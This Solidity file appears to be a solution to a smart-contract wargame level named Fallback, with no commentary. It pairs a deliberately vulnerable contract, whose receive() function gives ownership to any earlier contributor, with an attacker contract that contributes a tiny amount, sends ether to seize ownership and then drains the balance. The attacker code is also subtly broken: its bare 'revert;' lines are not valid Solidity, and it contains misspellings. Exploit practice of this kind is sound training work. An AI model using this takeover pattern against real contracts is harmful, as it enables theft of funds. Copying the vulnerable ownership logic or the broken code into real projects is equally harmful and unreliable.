
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}




contract ActtackFallback{
Fallback fallbacks;
address owner;
error AmountMoreThanRequired();
error failled();

constructor(address _fallback){
    fallbacks = Fallback(_fallback);
    owner = msg.sender;

}


function claimFallbackOwnerShip(uint256 amount) external payable returns(bool success){
if(amount > 0.001 ether) revert AmountMoreThanRequired();
fallbacks.contribute{value: 0.0008 ether}();

 (success,) = payable(address(fallbacks)).call{value: 0.0001 ether}("");

if(!success){
    revert failled();
}

}



function withdraw() external{

if(msg.sender != owner) revert;
fallbacks.withdraw();


if(address(this).balance > 0){

     
(bool succ,) =  payable(owner).call{value:address(this).balance}("");

if(!succ){
    revert;
}

}


}




receive() external payable {}




}